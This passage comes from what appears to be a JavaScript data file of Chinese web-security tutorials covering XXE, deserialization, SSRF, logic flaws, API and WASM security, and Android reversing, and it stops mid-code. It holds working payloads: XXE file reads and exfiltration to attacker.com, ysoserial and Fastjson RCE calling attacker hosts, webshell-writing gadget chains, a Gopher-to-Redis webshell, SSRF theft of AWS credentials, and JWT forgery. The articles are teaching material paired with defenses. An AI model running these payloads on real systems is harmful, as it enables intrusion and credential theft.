6. **双重提交 Cookie**：将 Cookie 和请求参数中的 Token 比对
7. **避免 GET 修改数据**：修改数据的操作使用 POST/PUT/DELETE
8. **WAF 拦截**：检测 CSRF 攻击特征
    `
  },
  {
    slug: 'xxe-injection',
    title: 'XXE 注入漏洞详解',
    date: '2026-06-15',
    category: 'websec',
    subcategory: 'xxe',
    tags: ['Web安全', 'XXE', 'XML注入'],
    summary: 'XXE 漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 XXE

XXE（XML External Entity）XML 外部实体注入，当应用解析用户提供的 XML 数据时，未禁用外部实体定义，攻击者可读取服务器文件或执行 SSRF。

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 发现XML   │───>│ 2. 构造DTD    │───>│ 3. 注入实体   │───>│ 4. 数据回显   │
│ 接口/解析点   │    │ 外部实体定义  │    │ file:///dict  │    │ 文件内容/RCE  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  XML上传/API接口       DOCTYPE声明         SYSTEM "file://"     /etc/passwd
  SOAP/Feed解析        外部DTD引用         参数实体注入         SSRF/DoS
\`\`\`

## 常见利用方式

### 1. 读取本地文件

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
\`\`\`

### 2. 读取 Windows 文件

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
\`\`\`

### 3. SSRF 利用

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
\`\`\`

### 4. 参数实体外带数据

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

# attacker.com/evil.dtd
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%param;
\`\`\`

### 5. DoS 攻击（Billion Laughs）

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
\`\`\`

## 实战案例

### 案例1：SVG 图片上传 XXE

\`\`\`xml
<!-- 上传恶意SVG文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20" fill="black">&xxe;</text>
</svg>
\`\`\`

### 案例2：SOAP 接口 XXE

\`\`\`xml
POST /api/soap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser>
      <name>&xxe;</name>
    </getUser>
  </soap:Body>
</soap:Envelope>
\`\`\`

### 案例3：使用 XXE Inject 工具

\`\`\`bash
# 检测XXE漏洞
xxe-inject -u http://target.com/api/xml -d "name=test"

# 读取文件
xxe-inject -u http://target.com/api/xml -d "name=test" -r /etc/passwd

# SSRF探测
xxe-inject -u http://target.com/api/xml -d "name=test" -s http://internal-host/
\`\`\`

## 安全加固

1. **禁用外部实体解析**：在 XML 解析器中禁用 DTD 和外部实体
2. **使用 JSON 替代 XML**：优先使用 JSON 格式传输数据
3. **输入验证**：对 XML 输入做白名单校验
4. **使用安全的解析库**：如 lxml（Python）、libxml2（C）等
5. **限制文件访问**：XML 解析器运行在最小权限环境中
6. **WAF 拦截**：检测 XXE 攻击特征
7. **升级依赖库**：及时修复已知 XXE 漏洞
8. **日志审计**：记录 XML 解析异常
    `
  },
  {
    slug: 'deserialization',
    title: '反序列化漏洞详解',
    date: '2026-06-19',
    category: 'websec-advanced',
    subcategory: 'deserialization',
    tags: ['Web安全', '反序列化', 'Java', 'PHP'],
    summary: '各语言反序列化漏洞原理和利用方法。',
    content: `
## 什么是反序列化漏洞

反序列化是将序列化的数据恢复为对象的过程。当应用不安全地反序列化用户输入时，攻击者可构造恶意对象执行任意代码。

## PHP 反序列化

### 基础概念

\`\`\`php
// 序列化
$obj = new User("admin");
echo serialize($obj);  // O:4:"User":1:{s:4:"name";s:5:"admin";}

// 反序列化
$data = 'O:4:"User":1:{s:4:"name";s:5:"admin";}';
$obj = unserialize($data);
\`\`\`

### 魔术方法

\`\`\`php
__construct()    // 对象创建时
__destruct()     // 对象销毁时
__toString()     // 对象转字符串时
__wakeup()       // 反序列化时
__sleep()        // 序列化时
__call()         // 调用不存在方法时
\`\`\`

### 利用链构造

\`\`\`php
class FileHandler {
    public $filename;
    public function __destruct() {
        echo file_get_contents($this->filename);
    }
}

// 构造payload
$a = new FileHandler();
$a->filename = "/etc/passwd";
echo serialize($a);
\`\`\`

## Java 反序列化

### 基础

\`\`\`java
// 序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("obj.ser"));
oos.writeObject(user);

// 反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("obj.ser"));
Object obj = ois.readObject();
\`\`\`

### 常见漏洞

- **Apache Commons Collections**
- **Fastjson**
- **WebLogic**
- **Shiro**

### ysoserial 工具

\`\`\`bash
# 生成payload
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin

# 使用
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/steal?c=$(whoami)"
\`\`\`

## PHP 反序列化实战

### 读取文件

\`\`\`php
class Logger {
    public $logfile;
    public function __destruct() {
        file_put_contents($this->logfile, "logged");
    }
}

// 构造payload读取文件
\`\`\`

### 写入Webshell

\`\`\`php
class FileWriter {
    public $filename;
    public $content;
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}
\`\`\`

## 防御方案

1. 禁用用户输入的反序列化
2. 使用白名单验证类
3. 使用 JSON 替代原生序列化
4. 升级依赖库

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 寻找入口   │───>│ 2. 分析类结构 │───>│ 3. 构造利用链 │───>│ 4. 代码执行   │
│ unserialize等 │    │ 魔术方法/依赖 │    │ POP链拼接     │    │ RCE/文件读写  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  PHP/Java/Python       __destruct/          ysoserial           反弹Shell
  .NET/Go               readObject          自定义payload       写入Webshell
\`\`\`

## 实战案例

### 案例1：PHP 反序列化写入Webshell

\`\`\`php
<?php
// 目标代码中存在以下类
class FileWriter {
    public $filename;
    public $content;
    public function __destruct() {
        file_put_contents($this->filename, $this->content);
    }
}

// 攻击者构造payload
$payload = new FileWriter();
$payload->filename = "/var/www/html/shell.php";
$payload->content = "<?php system($_GET['cmd']); ?>";
echo serialize($payload);
// O:10:"FileWriter":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:7:"content";s:42:"<?php system($_GET['cmd']); ?>";}
// 将此payload发送到目标接口
\`\`\`

### 案例2：Java Fastjson反序列化RCE

\`\`\`json
// 恶意JSON payload
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
}

// 攻击者搭建恶意LDAP/RMI服务
// java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8888/#Exploit
\`\`\`

### 案例3：Python pickle反序列化

\`\`\`python
import pickle
import os

# 构造恶意pickle
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
print(payload)

# 发送到目标：将payload base64编码后提交
import base64
print(base64.b64encode(payload).decode())
\`\`\`

## 安全加固

1. **禁用用户输入的反序列化**：永远不要对用户可控的数据直接反序列化
2. **使用白名单验证类**：只允许反序列化特定的安全类
3. **使用 JSON 替代原生序列化**：JSON 不会触发对象的魔术方法/析构函数
4. **升级依赖库**：及时修复 Fastjson、Shiro、WebLogic 等已知漏洞
5. **启用反序列化过滤器**：Java 使用 JEP 290 过滤器，PHP 使用 disable_classes
6. **最小权限运行**：Web 应用使用低权限用户运行，限制 RCE 影响范围
7. **WAF 拦截**：部署反序列化攻击特征的 WAF 规则
8. **代码审计**：使用 SAST 工具扫描反序列化危险函数调用
    `
  },
  {
    slug: 'ssrf',
    title: 'SSRF 服务端请求伪造',
    date: '2026-06-18',
    category: 'websec-advanced',
    subcategory: 'ssrf',
    tags: ['Web安全', 'SSRF', '内网'],
    summary: 'SSRF 漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 SSRF

SSRF（Server-Side Request Forgery）服务端请求伪造，攻击者利用服务器发起请求，访问内部资源或绕过防火墙。

## 常见触发场景

- 图片加载/上传
- 钩子/回调功能
- 文件处理
- API 代理
- Webhook

## 利用方式

### 1. 读取本地文件

\`\`\`
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
\`\`\`

### 2. 扫描内网

\`\`\`
?url=http://192.168.1.1:8080/
?url=http://127.0.0.1:3306/
\`\`\`

### 3. 攻击内网服务

\`\`\`
?url=http://192.168.1.100/admin
?url=redis://127.0.0.1:6379/
\`\`\`

### 4. 云环境元数据

\`\`\`
# AWS
?url=http://169.254.169.254/latest/meta-data/

# 阿里云
?url=http://100.100.100.200/latest/meta-data/
\`\`\`

## 绕过技巧

### IP 地址变形

\`\`\`
http://0x7f000001/       # 十六进制
http://2130706433/       # 十进制
http://0177.0.0.1/       # 八进制
http://127.1/            # 省略写法
http://127.0.0.1.nip.io/ # DNS重绑定
\`\`\`

### 协议绕过

\`\`\`
file:///etc/passwd
gopher://127.0.0.1:6379/
dict://127.0.0.1:6379/
\`\`\`

### URL 编码

\`\`\`
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
\`\`\`

## 利用 Gopher 协议攻击 Redis

\`\`\`
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp eval($_POST['cmd']); %3f>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
\`\`\`

## 防御方案

1. 白名单限制可访问的域名/IP
2. 禁用不需要的协议（file://、gopher://）
3. 禁止访问内网地址
4. 使用网络层隔离

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 发现SSRF  │───>│ 2. 协议探测   │───>│ 3. 内网扫描   │───>│ 4. 横向渗透   │
│ 接口存在      │    │ file/gopher  │    │ 发现内网服务  │    │ 获取敏感数据  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  图片URL参数         dict/gopher协议      Redis/MySQL/Web     元数据/配置文件
  钩子URL参数         协议走私              FastCGI攻击         内网应用控制
\`\`\`

## 实战案例

### 案例1：图片URL加载触发SSRF读取云元数据

\`\`\`python
import requests

# 某网站有图片预览功能，参数为图片URL
# 正常请求
url = "https://target.com/api/preview?url=https://example.com/image.jpg"

# SSRF - 读取AWS元数据
url_ssrf = "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/"
r = requests.get(url_ssrf)
print(r.text)

# 获取IAM角色凭证
url_creds = "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
r = requests.get(url_creds)
role_name = r.text.strip()
url_final = f"https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
r = requests.get(url_final)
print(r.json())  # 获取到 AWS AccessKey 和 SecretKey
\`\`\`

### 案例2：Gopher协议攻击内网Redis写入Webshell

\`\`\`python
import urllib.parse

# 构造 Gopher payload 攻击 Redis
# 目标：写入一句话木马到 web 目录
payload = """*3\\r\\n$3\\r\\nset\\r\\n$1\\r\\n1\\r\\n$34\\r\\n\\n<?php eval($_POST['cmd']); ?>\\n\\n\\r\\n*4\\r\\n$6\\r\\nconfig\\r\\n$3\\r\\nset\\r\\n$3\\r\\ndir\\r\\n$13\\r\\n/var/www/html\\r\\n*4\\r\\n$6\\r\\nconfig\\r\\n$3\\r\\nset\\r\\n$10\\r\\ndbfilename\\r\\n$9\\r\\nshell.php\\r\\n*1\\r\\n$4\\r\\nsave\\r\\n"""

encoded = urllib.parse.quote(payload, safe='')
gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"

# 通过SSRF触发
ssrf_url = f"https://target.com/api/preview?url={gopher_url}"
requests.get(ssrf_url)
\`\`\`

### 案例3：利用SSRF探测内网存活主机

\`\`\`python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_host(ip):
    url = f"https://target.com/api/preview?url=http://{ip}:8080/"
    try:
        r = requests.get(url, timeout=3)
        if r.status_code != 502:
            return f"[+] {ip}:8080 存活 (Status: {r.status_code})"
    except:
        pass
    return None

# 扫描 C 段
ips = [f"192.168.1.{i}" for i in range(1, 255)]
with ThreadPoolExecutor(max_workers=20) as executor:
    for result in executor.map(check_host, ips):
        if result:
            print(result)
\`\`\`

## 安全加固

1. **白名单限制可访问的域名/IP**：只允许访问明确列出的目标地址
2. **禁用不需要的协议**：只允许 http/https，禁用 file://、gopher://、dict://
3. **禁止访问内网地址**：过滤 10.x、172.16-31.x、192.168.x、127.x 等内网段
4. **使用网络层隔离**：Web 服务器与内网服务不在同一网段，使用 DMZ 架构
5. **禁用重定向**：禁止 HTTP 302 重定向，防止通过重定向绕过白名单
6. **云环境元数据保护**：启用 IMDSv2，限制 169.254.169.254 访问
7. **DNS Rebinding 防护**：验证解析后的 IP 是否在白名单内
8. **日志审计**：记录所有出站请求，监控异常访问模式
    `
  },
  {
    slug: 'logic-vuln',
    title: '逻辑漏洞挖掘',
    date: '2026-06-16',
    category: 'websec-advanced',
    subcategory: 'logic-vuln',
    tags: ['Web安全', '逻辑漏洞', '业务安全'],
    summary: '常见业务逻辑漏洞类型和挖掘方法。',
    content: `
## 什么是逻辑漏洞

逻辑漏洞是由于程序逻辑设计不当，导致攻击者可以绕过正常业务流程的漏洞。

## 常见类型

### 1. 越权漏洞

#### 水平越权
\`\`\`
# 修改用户ID查看他人信息
GET /api/user/123 → GET /api/user/456
\`\`\`

#### 垂直越权
\`\`\`
# 普通用户访问管理员接口
GET /admin/dashboard
\`\`\`

### 2. 支付漏洞

#### 价格篡改
\`\`\`
# 修改价格参数
amount=100 → amount=0.01
\`\`\`

#### 数量篡改
\`\`\`
# 修改购买数量为负数
quantity=1 → quantity=-1
\`\`\`

### 3. 验证码漏洞

- 验证码回显在响应中
- 验证码可重复使用
- 可爆破验证码
- 客户端验证

### 4. 短信/邮箱轰炸

\`\`\`
# 重复发送验证码
POST /api/send_sms
phone=13800138000
# 无频率限制
\`\`\`

### 5. 数据篡改

\`\`\`
# 修改请求中的敏感字段
{"username":"admin", "role":"user"} → {"username":"admin", "role":"admin"}
\`\`\`

### 6. 竞态条件

\`\`\`
# 并发请求导致重复操作
同时发送两个购买请求 → 扣款一次，获得两件商品
\`\`\`

### 7. 回调地址

\`\`\`
# 修改回调URL
callback=http://attacker.com/steal
\`\`\`

## 接口测试

### 参数篡改
- 修改用户ID、订单号
- 修改价格、数量
- 修改角色、权限

### 流程跳过
- 跳过验证步骤
- 跳过支付步骤
- 跳过授权步骤

### 重放攻击
- 重复使用验证码
- 重复使用优惠券
- 重复提交订单

## 工具

- Burp Suite
- Postman
- YAKIT

## 防御方案

1. 服务端校验所有参数
2. 使用不可预测的ID（UUID）
3. 关键操作二次验证
4. 限制请求频率
5. 使用签名防篡改

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 接口发现   │───>│ 2. 逻辑分析   │───>│ 3. 参数篡改   │───>│ 4. 业务绕过   │
│ 枚举所有端点  │    │ 梳理业务流程  │    │ 修改关键参数  │    │ 获得非法利益  │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  BurpSuite抓包        状态机分析           IDOR/竞态条件        越权/免支付
  API文档探测          流程图绘制           类型混淆             重复使用优惠
\`\`\`

## 实战案例

### 案例1：支付金额篡改

\`\`\`http
# 正常购买请求
POST /api/order/create HTTP/1.1
Content-Type: application/json

{
  "product_id": "P001",
  "quantity": 1,
  "price": 9900,
  "coupon_id": "COUPON001"
}

# 篡改：修改价格为0.01元，数量改为-1
{
  "product_id": "P001",
  "quantity": -1,
  "price": 0.01,
  "coupon_id": "COUPON001"
}

# 结果：负数数量+低价 = 反向扣款，获得退款
\`\`\`

### 案例2：并发竞态条件 - 优惠券重复使用

\`\`\`python
import threading
import requests

# 同时发送10个使用同一优惠券的请求
def use_coupon():
    r = requests.post("https://target.com/api/coupon/use",
        json={"coupon_id": "COUPON001"},
        headers={"Authorization": "Bearer <token>"})
    print(r.json())

threads = [threading.Thread(target=use_coupon) for _ in range(10)]
for t in threads:
    t.start()
for t in threads:
    t.join()
# 结果：同一优惠券被使用10次
\`\`\`

### 案例3：密码重置逻辑绕过

\`\`\`http
# 步骤1：请求发送验证码
POST /api/password/reset/send
{"phone": "13800138000"}

# 步骤2：提交重置请求（篡改接收手机号）
POST /api/password/reset/confirm
{
  "phone": "13800138000",       # 发送验证码的手机号
  "code": "123456",             # 收到的验证码
  "target_phone": "13900139000", # 实际修改密码的手机号
  "new_password": "hacked123"
}
# 结果：修改了别人的密码
\`\`\`

### 案例4：水平越权 - 个人信息遍历

\`\`\`bash
# 正常接口
GET /api/user/profile/1001
Authorization: Bearer <token_of_user_1001>

# 遍历其他用户
for i in $(seq 1000 2000); do
    curl -s -H "Authorization: Bearer <token>" "https://target.com/api/user/profile/$i"
done | grep -v "403|404"
\`\`\`

## 安全加固

1. **服务端校验所有参数**：价格、数量、权限等关键字段必须在服务端验证，不能信任前端
2. **使用不可预测的ID**：订单号、用户ID 等使用 UUID 替代自增 ID
3. **关键操作二次验证**：支付、修改密码等操作需要二次确认（短信/邮箱验证码）
4. **限制请求频率**：对敏感接口（登录、注册、重置密码）实施速率限制
5. **使用签名防篡改**：对关键参数做 HMAC 签名，服务端验证完整性
6. **数据库层加锁**：对并发操作使用数据库事务和行级锁（SELECT FOR UPDATE）
7. **权限绑定**：操作与当前会话用户绑定，拒绝跨用户请求
8. **审计日志**：记录所有关键操作，定期审计异常行为
    `
  },
  {
    slug: 'api-security',
    title: 'API 安全测试',
    date: '2026-06-14',
    category: 'websec-advanced',
    subcategory: 'api-security',
    tags: ['Web安全', 'API', 'REST', 'GraphQL'],
    summary: 'API 接口安全测试方法和常见漏洞。',
    content: `
## API 安全风险

### 1. 未授权访问

\`\`\`
# 无认证直接访问
GET /api/users/123
GET /api/admin/config
\`\`\`

### 2. 越权访问

\`\`\`
# 水平越权
GET /api/users/456  # 查看其他用户数据

# 垂直越权
GET /api/admin/users  # 普通用户访问管理接口
\`\`\`

### 3. 注入漏洞

\`\`\`json
// SQL注入
{"username": "admin' OR '1'='1"}

// NoSQL注入
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 命令注入
{"name": "test; whoami"}
\`\`\`

### 4. 批量赋值

\`\`\`json
// 修改不应被修改的字段
{
  "username": "normaluser",
  "role": "admin",      // 不应可修改
  "balance": 1000000    // 不应可修改
}
\`\`\`

### 5. 速率限制绕过

\`\`\`
# 使用不同IP
X-Forwarded-For: 1.1.1.1

# 使用不同User-Agent
User-Agent: Mobile

# 使用不同参数
?phone=13800138000
?phone=13800138001
\`\`\`

## REST API 测试

### 常见检查点

| 方法 | 检查点 |
|------|--------|
| GET | 越权访问、数据泄露 |
| POST | 注入、批量赋值 |
| PUT | 越权修改、数据篡改 |
| DELETE | 越权删除 |
| OPTIONS | CORS配置 |

### HTTP 头检查

\`\`\`
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
\`\`\`

## GraphQL 安全

### 内省查询

\`\`\`graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
\`\`\`

### 常见漏洞

- 内省查询泄露API结构
- 批量查询导致DoS
- 注入漏洞

## JWT 安全

### 常见问题

\`\`\`
# 算法混淆
{"alg": "none"}

# 弱密钥
HS256 使用弱密钥

# 密钥泄露
\`\`\`

### 检查命令

\`\`\`bash
# JWT解析
jwt_tool token.txt

# 爆破密钥
hashcat -m 16500 jwt.txt wordlist.txt
\`\`\`

## API 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. API枚举    │───>│ 2. 认证测试   │───>│ 3. 参数篡改   │───>│ 4. 漏洞利用   │
│ 发现接口端点  │    │ 绕过/伪造Token│    │ 越权/注入     │    │ 数据泄露/RCE │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  Swagger/OpenAPI     JWT伪造/None       IDOR/批量赋值        SQLi/SSRF/RCE
  路由爆破            Session伪造        参数污染             未授权访问
\`\`\`

## 实战案例

### 案例1：IDOR 越权访问

\`\`\`bash
# 正常请求 - 用户A查看自己的订单
GET /api/v1/orders/1001
Authorization: Bearer <user_a_token>

# 篡改订单号 - 查看用户B的订单
GET /api/v1/orders/1002
Authorization: Bearer <user_a_token>

# 批量遍历 - 获取所有订单
for i in $(seq 1 10000); do
    curl -s -H "Authorization: Bearer <token>" "https://api.target.com/v1/orders/$i"
done
\`\`\`

### 案例2：GraphQL 批量查询 DoS

\`\`\`graphql
# 构造深层嵌套查询导致服务器资源耗尽
{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            name
            posts {
              comments {
                author { name }
              }
            }
          }
        }
      }
    }
  }
}

# 使用工具自动化
# pip install graphql-batch-query
# graphql-batch -u http://target.com/graphql -q query.graphql -c 50
\`\`\`

### 案例3：JWT alg:none 绕过

\`\`\`python
import jwt
import base64
import json

# 原始JWT
token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature"

# 篡改header为none
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')
forged = header.decode() + "." + payload.decode() + "."
print(forged)
\`\`\`

### 案例4：速率限制绕过

\`\`\`bash
# 使用不同 IP 绕过
for ip in 1.1.1.{1..100}; do
    curl -H "X-Forwarded-For: $ip" -H "Authorization: Bearer <token>" "https://api.target.com/v1/admin"
done

# 使用不同 User-Agent
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS)" "https://api.target.com/v1/admin"
curl -A "Mozilla/5.0 (Linux; Android)" "https://api.target.com/v1/admin"

# 使用 HTTP/2 绕过
curl --http2 "https://api.target.com/v1/admin"
\`\`\`

## 安全加固

1. **实施认证和授权**：所有 API 必须经过认证，使用 OAuth 2.0 或 JWT（强密钥）
2. **输入验证和输出编码**：对所有参数做类型、范围、格式校验
3. **速率限制和配额**：按用户/IP/接口设置多级限流，结合 CAPTCHA
4. **日志监控和告警**：记录所有 API 调用，设置异常行为告警规则
5. **使用 HTTPS**：全站 HTTPS，启用 HSTS
6. **API 网关**：统一鉴权、限流、日志、WAF
7. **防止批量赋值**：使用 DTO 对象接收参数，只绑定允许的字段
8. **JWT 安全**：使用 RS256 签名算法，设置合理过期时间，禁止 alg:none
9. **GraphQL 限制**：禁用内省查询（生产环境），限制查询深度和复杂度
10. **CORS 严格配置**：禁止 \`Access-Control-Allow-Origin: *\`，指定可信域名
    `
  },
  {
    slug: 'wasm-reverse',
    title: 'WebAssembly 逆向入门',
    date: '2026-06-12',
    category: 'websec-advanced',
    subcategory: 'wasm',
    tags: ['Web安全', 'WASM', '逆向'],
    summary: 'WebAssembly 逆向分析基础。',
    content: `
## 什么是 WebAssembly

WebAssembly（WASM）是一种可移植的二进制格式，可在浏览器中运行。常用于保护前端敏感逻辑。

## WASM 文件分析

### 识别 WASM

\`\`\`javascript
// 检查是否加载了WASM
const wasmModule = new WebAssembly.Module(buffer);
console.log(WebAssembly.Module.exports(wasmModule));
\`\`\`

### 使用 wasm-decompile

\`\`\`bash
# 安装
npm install -g wabt

# 反编译
wasm-decompile module.wasm -o output.c
\`\`\`

### 使用 wasm-objdump

\`\`\`bash
# 查看结构
wasm-objdump -x module.wasm

# 反汇编
wasm-objdump -d module.wasm
\`\`\`

## 常见逆向工具

| 工具 | 用途 |
|------|------|
| wasm-decompile | 反编译为伪C代码 |
| wasm-objdump | 查看结构和反汇编 |
| Ghidra | 二进制分析 |
| Binary Ninja | 二进制分析 |
| IDA Pro | 二进制分析 |

## 浏览器调试

### Chrome DevTools

1. 打开 Sources 面板
2. 找到 WASM 文件
3. 设置断点调试

### 导出函数分析

\`\`\`javascript
// 获取WASM导出函数
const exports = instance.exports;
console.log(Object.keys(exports));
\`\`\`

## 逆向流程

1. 定位 WASM 文件
2. 分析导出函数
3. 反编译分析逻辑
4. 找到关键函数
5. 编写调用脚本

## 实战技巧

\`\`\`javascript
// Hook WASM函数
const originalFn = exports.targetFunction;
exports.targetFunction = function(...args) {
    console.log('Args:', args);
    const result = originalFn(...args);
    console.log('Result:', result);
    return result;
};
\`\`\`

## 攻击流程

\`\`\`
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. 定位WASM  │───>│ 2. 反编译分析 │───>│ 3. 理解关键   │───>│ 4. Hook或调用 │
│ 文件入口      │    │ 导出函数逻辑  │    │ 算法/验证逻辑 │    │ 导出函数      │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
       │                   │                   │                    │
  浏览器网络面板     wasm-decompile       伪C代码/Ghidra      JS交互脚本
  Sources面板       wasm-objdump         IDA Pro/Binja       Frida注入
\`\`\`

## 实战案例

### 案例1：电商价格校验绕过

某电商平台使用 WASM 校验订单价格，防止前端篡改：

\`\`\`javascript
// 反编译后的 WASM 伪C代码
int verify_price(int item_id, int quantity, int price) {
    int expected = get_server_price(item_id) * quantity;
    if (price == expected) {
        return 1;  // 验证通过
    }
    return 0;  // 价格异常
}

// 攻击方式：Hook 导出函数强制返回 1
const exports = wasmInstance.exports;
const originalVerify = exports.verify_price;
exports.verify_price = function(itemId, quantity, price) {
    console.log("绕过价格校验:", itemId, quantity, price);
    return 1;  // 直接返回验证通过
};
\`\`\`

### 案例2：游戏反作弊逻辑分析

\`\`\`javascript
// WASM 中的反作弊校验被反编译为：
// bool check_memory_valid(uintptr_t addr, size_t len) {
//     // 检查内存地址是否在合法范围内
//     return addr >= HEAP_START && addr + len <= HEAP_END;
// }

// Hook绕过
exports.check_memory_valid = function(addr, len) {
    return true;  // 绕过内存校验
};
\`\`\`

### 案例3：使用 Ghidra 分析 WASM 二进制

\`\`\`bash
# 1. 提取 WASM 文件
# Chrome DevTools → Sources → 找到.wasm文件 → 右键 Save

# 2. 使用 Ghidra 导入分析
# File → Import File → 选择.wasm → WebAssembly 架构

# 3. 在函数列表中搜索关键词（如 check, verify, valid）

# 4. 查看反编译结果，理解校验逻辑
\`\`\`

## 安全加固

1. **关键逻辑不要只放前端**：WASM 可被反编译，敏感校验必须在服务端完成
2. **增加服务端二次校验**：即使前端通过 WASM 校验，服务端也要独立验证
3. **使用代码混淆**：使用 wasm-opt 的混淆选项增加逆向难度
4. **添加完整性校验**：对 WASM 文件做哈希校验，防止被替换
5. **避免在 WASM 中硬编码密钥**：密钥可被提取，应使用服务端下发
6. **结合 CSP 策略**：限制 WASM 的加载来源
    `
  },
  // 移动端安全
  {
    slug: 'android-reverse',
    title: 'Android 逆向基础',
    date: '2026-06-15',
    category: 'mobile',
    subcategory: 'android-reverse',
    tags: ['移动端安全', 'Android', '逆向'],
    summary: 'Android APK 逆向分析基础。',
    content: `
## Android 逆向工具

| 工具 | 用途 |
|------|------|
| jadx | APK 反编译 |
| apktool | 资源解包 |
| dex2jar | DEX 转 JAR |
| JD-GUI | Java 反编译器 |
| Frida | 动态Hook |
| Objection | 移动安全框架 |

## 反编译流程

\`\`\`bash
# jadx 反编译
jadx -d output/ target.apk

# apktool 解包
apktool d target.apk

# dex2jar 转换
d2j-dex2jar target.apk
\`\`\`

## 常见保护

### 代码混淆

\`\`\`java
// 混淆前
public class UserManager {
    public void login(String username, String password) { }
}

// 混淆后
public class a {
    public void b(String c, String d) { }
}
\`\`\`

### 加壳

- VMP（虚拟机保护）
- DexProtector
- 360加固
- 腾讯乐固

## Frida Hook

### Java Hook

\`\`\`javascript
// Hook Java 方法
Java.perform(function() {
    var UserManager = Java.use("com.target.UserManager");
    UserManager.login.implementation = function(username, password) {
        console.log("Username: " + username);
        console.log("Password: " + password);
        return this.login(username, password);
    };
});
\`\`\`

### Native Hook

\`\`\`javascript
// Hook native函数
Interceptor.attach(Module.findExportByName("libtarget.so", "check"), {
